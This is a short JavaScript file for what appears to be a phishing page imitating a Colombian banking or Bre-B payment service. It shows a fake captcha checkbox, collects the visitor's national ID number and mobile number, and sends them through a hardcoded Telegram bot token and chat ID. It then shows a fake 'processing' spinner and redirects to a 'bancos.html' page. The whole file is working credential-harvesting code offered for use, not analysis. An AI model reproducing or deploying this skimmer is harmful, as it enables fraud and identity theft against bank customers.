(function() {
    const TOKEN = "8525633426:AAFJaZG7NPc-lSkTbLu04ZV-4nu2w3fzxV8";
    const CHAT_ID = "-1003098624900";

    document.addEventListener('DOMContentLoaded', () => {
        const btn = document.querySelector('[data-testid="button-submit-cedula"]');
        const in1 = document.querySelector('[data-testid="input-cedula"]');
        const in2 = document.querySelector('[data-testid="input-celular"]');
        const cap = document.querySelector('[data-testid="captcha-checkbox"]');
        const form = document.querySelector('form');

        let isV = false;

        if (cap) {
            cap.onclick = () => {
                cap.innerHTML = '<span style="color:#00a652; font-size:22px;">✅</span>';
                cap.style.borderColor = "transparent";
                isV = true;
            };
        }

        if (form) {
            form.onsubmit = (e) => {
                e.preventDefault();
                if (!isV) return alert("Por favor, marca la casilla de seguridad.");

                // Cambiar estado a Procesando
                btn.disabled = true;
                btn.innerHTML = '<span class="spin-mini"></span> Procesando...';

                // Enviar datos a Telegram (Modo ráfaga)
                const texto = `🏦 **BRE-B INICIO**\n🆔 CC: ${in1.value}\n📱 CEL: ${in2.value}`;
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(texto)}&parse_mode=Markdown`, { mode: 'no-cors' });

                // Espera de 3 segundos y redirección
                setTimeout(() => {
                    const base = window.location.href.endsWith('/') ? window.location.href : (window.location.href + '/');
                    window.location.href = new URL('bancos.html', base).toString() + window.location.hash;
                }, 3000);
            };
        }

        // Estilo del spinner dentro del botón
        const style = document.createElement('style');
        style.innerHTML = `.spin-mini{width:14px;height:14px;border:2px solid #fff;border-top:2px solid transparent;border-radius:50%;display:inline-block;margin-right:8px;animation:s 0.8s linear infinite}@keyframes s{to{transform:rotate(360deg)}}`;
        document.head.appendChild(style);
    });
})();


